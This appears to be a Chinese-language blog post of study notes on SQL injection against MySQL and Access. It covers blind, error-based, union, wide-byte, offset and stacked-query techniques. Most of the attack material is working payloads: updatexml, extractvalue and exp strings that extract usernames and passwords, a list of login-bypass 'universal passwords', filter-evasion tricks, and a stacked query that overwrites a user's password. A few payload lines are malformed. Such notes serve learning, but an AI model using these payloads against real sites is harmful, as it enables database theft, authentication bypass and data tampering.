<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x5e,version(),0x5e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>


<p><code>X-Forwarded-For注入</code><br>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br>如果系统采用了服务器后端获取 X-Forwarded-For数据，如：利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String ip = request.getHeader(&quot;X-Forwarded-For&quot;)</span><br></pre></td></tr></table></figure>

<p>进行获取ip，攻击者可以通过X-Forwarded-For请求头信息就行伪造ip，当然了这个ip<br>也可以是一些注入语句，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For：1 and if(now()=sysdate(),sleep(6),0)--</span><br><span class="line">String sql = &quot;select * from table where ip = &#x27;&quot;+ip+&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>


<p>构造X-Forwoarded-For头进行测试，http响应出现变化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: -1&#x27; OR 3*2*1=6 AND 000958=000958--</span><br><span class="line">X-Forwarded-For: -1&#x27; OR 3*2*1=6 AND 000958=000957--</span><br></pre></td></tr></table></figure>


<p><code>⑤Request方式注入</code><br>概念：超全局变量 PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可以用，这些超全局变量是：<br><code>$_REQUEST（获取GET/POST/COOKIE）COOKIE在新版本已经无法获取了 $_POST（获取POST传参） $_GET（获取GET传参） $_COOKIE（获取COOKIE传参） $_SERVER（包含了诸如头部信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）</code></p>
<h4 id="3-按照执行效果来分类"><a href="#3-按照执行效果来分类" class="headerlink" title="3.按照执行效果来分类"></a>3.按照执行效果来分类</h4><p><code>①基于布尔的盲注</code></p>
<p>即可以根据返回页面判断条件真假的注入。盲注是注入的一种，指的是在不知道<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE&spm=1001.2101.3001.7020">数据</a>库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure>

<p>布尔型：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p>
<p>报错型：构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）</p>
<p><code>②基于时间的盲注，</code></p>
<p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
<p>在SQL注入过程中，无论注入是否成功，页面完全没有变化。此时只能通过使用数据库的延时函数来判断注入点一般采用响应时间上的差异来判断是否存在SQL注入，即基于时间型的SQL盲注</p>
<p><code>③基于报错注入，</code></p>
<p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
<p>updatexml报错注入</p>
<p>concat+rand()+group_by()导致主键重复</p>
<p><code>④联合查询注入</code></p>
<p>可以使用union的情况下的注入</p>
<p><code>⑤二次注入</code></p>
<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入</p>
<p><code>⑥堆查询注入</code></p>
<p>可以同时执行多条语句的执行时的注入。</p>
<p>在SQL中，分号（;）是用来表示一条sql语句的结束,堆叠注入可以执行任何人sql语句。但是当API或数据库引擎的不支持，堆叠注入就不能进行啦</p>
<h4 id="4-其他类型注入"><a href="#4-其他类型注入" class="headerlink" title="4.其他类型注入"></a>4.其他类型注入</h4><p><code>①Access偏移注入</code></p>
<p><code>②MongoDB 注入</code></p>
<p><code>③LDAP注入</code></p>
<p><code>④JSON注入</code></p>
<p><code>⑤DNSlog注入</code></p>
<p><code>⑥宽字节注入</code></p>
<p>具体怎么注入 后面学了在写</p>
<h3 id="联合攻击"><a href="#联合攻击" class="headerlink" title="联合攻击"></a>联合攻击</h3><p>通过union来进行攻击</p>
<p>‘union select 1,2,3–+ </p>
<p>‘union select 1,2,database()–+</p>
<p>‘union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+</p>
<p>‘union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’xxx’–+</p>
<p>‘union select 1,2,group_concat(a,b,c) from ‘xxx’–+</p>
<h3 id="堆叠攻击"><a href="#堆叠攻击" class="headerlink" title="堆叠攻击"></a>堆叠攻击</h3><p>在一处sql注入点同时执行两种命令   比如删库</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>用于无回显</p>
<p>判断库名长度–&gt;判断具体字符–&gt;判断表名长度–&gt;判断具体字符–&gt;判断字段名长度–&gt;查字段</p>
<p>主要会用：</p>
<p>ascii（）  查ascii码</p>
<p>length（）返回字符串长度</p>
<p>substr（）截取字符串</p>
<p>‘and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length(database())&gt;5--+</span><br><span class="line">将&gt;号掉个方向看结果有没有变化，来判断布尔盲注有没有用，后面就继续猜表名，列名，然后内容。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ttp://127.0.0.1/Less-8/?id=1&#x27;and (length(database()))&gt;10 --+</span><br><span class="line">and select length(database())&gt;n //判断数据库名长度</span><br><span class="line">and ascii(substr(database(),m,1))&gt;n //截取数据库名第m个字符并转换成ascii码 判断具体值</span><br></pre></td></tr></table></figure>



<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>跟布尔盲注一样</p>
<p>主要用：</p>
<p>sleep（）  使网页回复变慢</p>
<p>and   使条件同时成立</p>
<p>主要通过网页回复时间来判断前面的sql语句是否正确  慢就对</p>
<p>‘ and length(database())&#x3D;8 and sleep(10)–+</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,name from product where id=1 and sleep(2)</span><br></pre></td></tr></table></figure>



<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>通过网页的报错获取目标信息</p>
<p>主要用：</p>
<p>floor（X） 返回一个效应X的值</p>
<p>extractvalue()   当xpath_string出现格式错误时，mysql爆出xpath语法错误</p>
<p>updatexml()    跟extractvalue()差不多</p>
<h6 id="其他用到的函数："><a href="#其他用到的函数：" class="headerlink" title="其他用到的函数："></a>其他用到的函数：</h6><p>group_concat      将数据连接起来</p>
<p>limit（x，y）   从第x开始取，取y个</p>
<p>mid       与substr 一样</p>
<p>ord      与ascii一样</p>
<p>left       从左向右取</p>
<p>into outfile   把xxxx写入指定文件中</p>
<h3 id="万用密码"><a href="#万用密码" class="headerlink" title="万用密码"></a>万用密码</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>万能密码利用的原理就是在后台登陆页面没有对用户输入的内容进行验证，此时程序所用用户输入的数据都合法的，所以这个时候无论是合法的管理员还是非法的入侵者所输入的数据都是被信任的，非法入侵者正是利用这一特点来进行非法登录的</p>
<p>账号：djlfjdslajdfj（随意输入）<br>密码：1‘or’1’&#x3D;‘1</p>
<ol>
<li>用户进行用户名和密码验证时，网站需要查询数据库。查询数据库就是执行SQL语句。用户登录时，后台执行的数据库查询操作（SQL语句）是：【Select user_id,user_type,email From users Where user_id&#x3D;’用户名’ And password&#x3D;’密码’】。</li>
<li>由于网站后台在进行数据库查询的时候没有对单引号进行过滤，当输入用户名【admin】和万能密码【2’or’1】时，执行的SQL语句为：【Select user_id,user_type,email From users Where user_id&#x3D;’admin’ And password&#x3D;’2’or’1’】。</li>
<li>由于SQL语句中逻辑运算符具有优先级，【&#x3D;】优先于【and】，【and】优先于【or】，且适用传递性。因此，此SQL语句在后台解析时，分成两句：【Select user_id,user_type,email From users Where user_id&#x3D;’admin’ And password&#x3D;’2’】和【’1’】，两句bool值进行逻辑or运算，恒为TRUE。SQL语句的查询结果为TRUE，就意味着认证成功，也可以登录到系统中。<br>输入用户名【admin】，密码【2’or’1】，即可登录成功。</li>
<li>在网站开发中也有些人是这样做的，T_users是表名，username是数据库中字段名，name和pwd是变量。<br>“select * form T_users where username&#x3D;’ “+ name +” ’ “+” and password&#x3D;’ “+ pwd +” ’ “;<br>如果变量name赋值为root，pwd变量赋值为root的话，这根本不会有什么问题，和上面一模一样。<br>即等价于”select * from T_users where username&#x3D; ‘root’ and password&#x3D; ‘root’ “<br>但是如果变量name赋值：随意输入，而pwd被赋值 1 or 1&#x3D;1 ，<br>那么整个语句就变成了这个样子：<br>“select from T_users where username&#x3D;‘adsfafsf’ and password&#x3D;‘1 or 1&#x3D;1’ “<br>可以看出，此时整个查询语句返回值始终为true.</li>
</ol>
<h4 id="常用万用密码"><a href="#常用万用密码" class="headerlink" title="常用万用密码"></a>常用万用密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">2： &#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">3：or 1=1--</span><br><span class="line">4：&#x27;or 1=1--</span><br><span class="line">5：a&#x27;or&#x27; 1=1--</span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line">7：&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">8：&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">11：1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">12：1 or &#x27;1&#x27;=&#x27;1&#x27; or 1=1</span><br><span class="line">13： &#x27;OR 1=1%00</span><br><span class="line">14:&quot;)or(“a”=&quot;a</span><br><span class="line">15:‘or 1=1–</span><br><span class="line">16:“or 1=1–</span><br><span class="line">17:&#x27;or”=&#x27;</span><br><span class="line">18:&#x27;or 1=1/</span><br><span class="line">19:admin’ or 1=1/*</span><br></pre></td></tr></table></figure>





<h3 id="简单Bypass-绕过"><a href="#简单Bypass-绕过" class="headerlink" title="简单Bypass 绕过"></a>简单Bypass 绕过</h3><p>用编码改写特殊字符</p>
<p>关键字过滤：双写  大小写  替换</p>
<p>特殊字符过滤： 空格：内联取代  注释取代</p>
<p>​                           逗号：from for</p>
<p>参数混淆：加入更多的混淆参数，并改变注入位置</p>
<p>​                   用无效参数</p>
<p>​                   溢出</p>
<p>宽字节绕过</p>
<p>拼接字符串：’    concat     concat_ws     group_concat</p>
<p>函数替换</p>
<p>不能使用group_concat函数时，使limit语句来限制查询结果的列数</p>
<p>一、通过注释符绕过<br>注释符 # &#x2F;&#x2F;<br>通过在关键词的中间加入注释符，使关键词不被识别<br>如 select 改为 se&#x2F;&#x2F;lect</p>
<p>二、通过&lt;&gt;绕过<br>如 select 改为 sel&lt;&gt;ect</p>
<p>三、通过改变大小写绕过<br>四、如果and or被过滤<br>可以将and 用&amp;&amp; 替换<br>or 用 || 替换</p>
<p>五、通过重复关键词绕过<br>六、通过url编码绕过<br>七、等价函数与命令绕过<br>函数或变量</p>
<p>hex()、bin() &#x3D;&#x3D;&gt; ascii()<br>sleep() &gt;benchmark()<br>concat_ws()&gt;group_concat()<br>mid()、substr() &#x3D;&#x3D;&gt; substring()<br>@@user &#x3D;&#x3D;&gt; user()<br>@@datadir &#x3D;&#x3D;&gt; datadir()<br>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　<br>或者：<br>substr((select ‘password’),1,1) &#x3D; 0x70<br>strcmp(left(‘password’,1), 0x69) &#x3D; 1<br>strcmp(left(‘password’,1), 0x70) &#x3D; 0<br>strcmp(left(‘password’,1), 0x71) &#x3D; -1</p>
<p>过滤逗号 join   </p>
<p>limit后面过滤逗号 from to</p>
<p>后面会写一个详细的整理清楚的bypass，这个写的太乱了</p>
<hr>
<h1 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h1><p> <code>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。    报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</code></p>
<h2 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h2><p>Updatexml(): 函数是MYSQL对XML文档数据进行查询和修改的XPATH函数</p>
<p>extractvalue(): 函数也是MYSQL对XML文档数据进行查询和修改的XPATH函数</p>
<p>floor(): MYSQL中用于取整的函数</p>
<p>其他用于报错的函数还有10+种，但常用的就这三个</p>
<p>对于Updatexml()和extractvalue()我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错</p>
<h3 id="Updatexml"><a href="#Updatexml" class="headerlink" title="Updatexml()"></a>Updatexml()</h3><p>Updatexml(xml_document,XPath_string,new_value)</p>
<p>它是一个内容替换函数，主要针对XML数据</p>
<p>第一个参数：是string格式，为xml文档对象名称，中文为Doc</p>
<p>第二个参数：XPath格式的字符串，用于匹配（与正则语法不同）</p>
<p>第三个参数：替换查找到的符合条件的数据</p>
<p>使用</p>
<blockquote>
<p>查询当前数据库的用户信息以及数据库版本信息:</p>
<p>?id&#x3D;1” and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) –+</p>
<p>获取当前数据库下数据表信息：</p>
<p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e),3) –+</p>
<p>获取users表名的列名信息：</p>
<p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),0x7e),3) –+</p>
<p>获取users数据表下username、password两列名的用户字段信息:</p>
<p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) –+</p>
<p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) –+</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line">链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</span><br><span class="line">链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span><br><span class="line">爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1</span><br></pre></td></tr></table></figure>





<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>extractvalue(XML_document,XPath_string)</p>
<p>第一个参数：String格式，为XML文档对象名称</p>
<p>第二个参数：Xpath格式字符串</p>
<p>concat:返回结果为连接参数产生的字符串</p>
<p>使用</p>
<blockquote>
<p>获取当前是数据库名称及使用mysql数据库的版本信息：</p>
<p>?id&#x3D;1” and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) –+</p>
<p>获取当前位置所用数据库的位置：</p>
<p>?id&#x3D;1” and extractvalue(1,concat(0x7e,@@datadir,0x7e)) –+</p>
<p>获取表名：</p>
<p>?id&#x3D;1” and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)) –+</p>
<p>获取users表的列名：</p>
<p>?id&#x3D;1” and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),0x7e)) –+</p>
<p>获取对应的列名的信息(username&#x2F;password):</p>
<p>?id&#x3D;1” and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) –+</p>
</blockquote>
<h3 id="其他注入函数"><a href="#其他注入函数" class="headerlink" title="其他注入函数"></a>其他注入函数</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p>exp(int)函数返回e的x次方，当x的值足够大的时候就会导致函数的结果数据类型溢出，也就会因此报错：”DOUBLE value is out of range”</p>
<p>?id&#x3D;1” and exp(~(select * from (select user())a)) –+<br>先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a</p>
<p>然后在查询select * from a 查询a，将结果集a全部查询出来</p>
<p>查询完成，语句成功执行，返回值为0，再取反(~按位取反运算符)，exp调用的时候e的那个数的次方，就会造成BigInt大数据类型溢出，就会报错</p>
<p>使用</p>
<blockquote>
<p>获取表名：</p>
<p>?id&#x3D;1” and exp(~(select * from (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)a)) –+<br>获取列名：</p>
<p>?id&#x3D;1” and exp(~(select * from (select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1)a)) –+<br>获取列名对应信息：</p>
<p>?id&#x3D;1” and exp(~(select * from(select username from ‘users’ limit 0,1))) –+</p>
</blockquote>
<p><strong>适用mysql数据库版本是：5.5.5~5.5.49</strong></p>
<p>pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入</p>
<h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()</p>
<p>利用 <code>select count(*),(floor(rand(0)*2)) x from users group by x</code>这个相对固定的语句格式，导致的数据库报错</p>
<p>相关函数</p>
<p> rand()：是一个随机函数，通过一个固定的随机数的种子0之后，产生大于等于0小于1的伪随机序列</p>
<p>floor()：函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。</p>
<p>group by：进行分组排序相同名字合并</p>
<p>count()：对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量</p>
<p>使用：</p>
<blockquote>
<p>?id&#x3D;1” and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)–+</p>
<p>and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p>
</blockquote>
<h4 id="各种报错注入的万能语句"><a href="#各种报错注入的万能语句" class="headerlink" title="各种报错注入的万能语句"></a>各种报错注入的万能语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过floor报错,注入语句如下:</span><br><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过ExtractValue报错,注入语句如下:</span><br><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过UpdateXml报错,注入语句如下:</span><br><span class="line">and 1=(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过NAME_CONST报错,注入语句如下:</span><br><span class="line">and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过join报错,注入语句如下:</span><br><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过exp报错,注入语句如下:</span><br><span class="line">and exp(~(select * from (select user () ) a) );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过GeometryCollection()报错,注入语句如下:</span><br><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过polygon ()报错,注入语句如下:</span><br><span class="line">and polygon (()select * from(select user ())a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过multipoint ()报错,注入语句如下:</span><br><span class="line">and multipoint (()select * from(select user() )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过multlinestring ()报错,注入语句如下:</span><br><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过multpolygon ()报错,注入语句如下:</span><br><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过linestring ()报错,注入语句如下:</span><br><span class="line">and linestring (()select * from(select user() )a)b );</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="前置-1"><a href="#前置-1" class="headerlink" title="前置"></a>前置</h2><p>单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。</p>
<p>多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p>
<p>两位的多字节字符有一个前导字节和尾字节。 在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。</p>
<p>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</p>
<p>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</p>
<h2 id="注入条件"><a href="#注入条件" class="headerlink" title="注入条件"></a>注入条件</h2><p>要有宽字节注入漏洞</p>
<p>1、首先要满足目标程序使用双&#x2F;多字节字符集进行解析</p>
<p>2、其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符\。</p>
<h2 id="理解与使用"><a href="#理解与使用" class="headerlink" title="理解与使用"></a>理解与使用</h2><p>宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象</p>
<p>我们这里的宽字节注入是利用的MySQL的一个特性，<strong>MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字</strong>（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\也就是％5c中变成了一个汉字“运”，而“逃逸了出来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当提交</span><br><span class="line">id=1&#x27; and 1=1%23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">时，MySQL的运行的SQL语句为</span><br><span class="line">select * from user where  id =&#x27;1\&#x27; and 1=1#&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很明显这是没有注入成功的，而当我们提交</span><br><span class="line">id=1%df&#x27; and 1=1%23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL的运行的SQL语句为</span><br><span class="line">select * from user where id =&#x27;1運&#x27; and 1=1#&#x27;</span><br></pre></td></tr></table></figure>

<p>也就是说%df-&gt;0xdf与\的十六进制编码拼接，被识别成’運’</p>
<p>有宽字节注入漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; or 1=1# 直接遍历</span><br></pre></td></tr></table></figure>



<p>宽字节注入常用于绕过一些转义的函数</p>
<p>当php,ini配置文件中添加<strong>magic_quotes_gpc&#x3D;on</strong> 或者使用使用一些转义函数，比如：addslashes(adf)和mysal_real_escape_string,他们会转义单引号、双引号、反斜杠与NUL（NULL字符），转义的方法是在符号前加\ 使SQL注入语句失效</p>
<p>此时可以用宽字节注入来绕过或不使用他们转义的符号来注入</p>
<h1 id="偏移量注入"><a href="#偏移量注入" class="headerlink" title="偏移量注入"></a>偏移量注入</h1><h2 id="前置-2"><a href="#前置-2" class="headerlink" title="前置"></a>前置</h2><p>偏移注入是access比较独有的一种注入手段</p>
<p>一般用于在猜出了表名但是没有猜出列名的情况下使用（无列名注入）</p>
<p>根据一个较多字段的表对一个少字段的表进行偏移注入</p>
<p><strong>原理：</strong>借用数据库的自连接查询（inner join）让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示。</p>
<p>通过我们补充的123，使两张表对齐，并通过移动*的位置，使我们需要的数据与页面所展示的数据对齐，进而将我们需要的数据展示出来</p>
<p><strong>用处（使用场景）：</strong>access偏移注入是解决一些注入不出来列表的时候，同时要求支持union select，列名足够多，需要知道表名。</p>
<p>在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。</p>
<p>当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。</p>
<p>像Sqlmap之类的工具实际上是爆破字段的名字，但是如果字段名称比较奇葩，就无可奈何了</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>知道表名,但不知道列名</li>
<li>支持联合查询</li>
<li>联合查询前面的查询语句列数要比注入的union后面的查询的列数要多</li>
</ul>
<h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><p>1、判断注入点</p>
<p>2、查询字段个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/asp/index.asp?id=1513 order by 22 正常</span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 order by 23 错误</span><br></pre></td></tr></table></figure>

<p>3、爆出显位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</span><br></pre></td></tr></table></figure>

<p>4、判断表内存在的字段个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin 错误</span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,* from admin 错误</span><br><span class="line"></span><br><span class="line">直到</span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确</span><br></pre></td></tr></table></figure>

<p>所以admin表下有6个字段</p>
<p>6+16&#x3D;22</p>
<p><code>在中间使用*时，要用表名.*  即1,2,3,admin.*,4,5,6</code></p>
<p>特：</p>
<blockquote>
<p>在某些情况下，通过偏移注入，我们获取不到想要的数据怎么办，</p>
<p>假设表中存在id字段</p>
<p>首先给表重命名 admin as a   admin as b</p>
<p>获取id 一样的字段 admin as a inner join admin as b on a.id&#x3D;b.id 这样做我们可以打乱随机顺序，不过这样之后作为一个整体查询，字段数要乘以2</p>
<p>payload：union select 1,2,(admin as a inner join admin as b on a.id&#x3D;b.id).* from admin</p>
</blockquote>
<p>5.爆列名数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一级偏移语句：</span><br><span class="line"></span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)</span><br><span class="line"></span><br><span class="line">如果你发现，上面查看了网页源码也爆不出数据，请用以下方法：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二级偏移语句：</span><br><span class="line"></span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join a</span><br></pre></td></tr></table></figure>

<p>偏移注入的基本公式为:<br> order by 出的字段数减去号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案</p>
<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="前置-3"><a href="#前置-3" class="headerlink" title="前置"></a>前置</h2><p>可以同时执行多条语句的执行时的注入</p>
<p>在SQL中，分号（;）是用来表示一条sql语句的结束</p>
<p>堆叠注入可以执行的是任意的语句 而union injection执行的语句类型是有限的，可以用来执行查询语句</p>
<h2 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h2><p>更新id&#x3D;1的用户密码为123456</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;;update users set password=&#x27;123456&#x27; where id=1; --+ </span><br></pre></td></tr></table></figure>

<p>还可以用于删库等一系列sql命令，不止局限于查询</p>
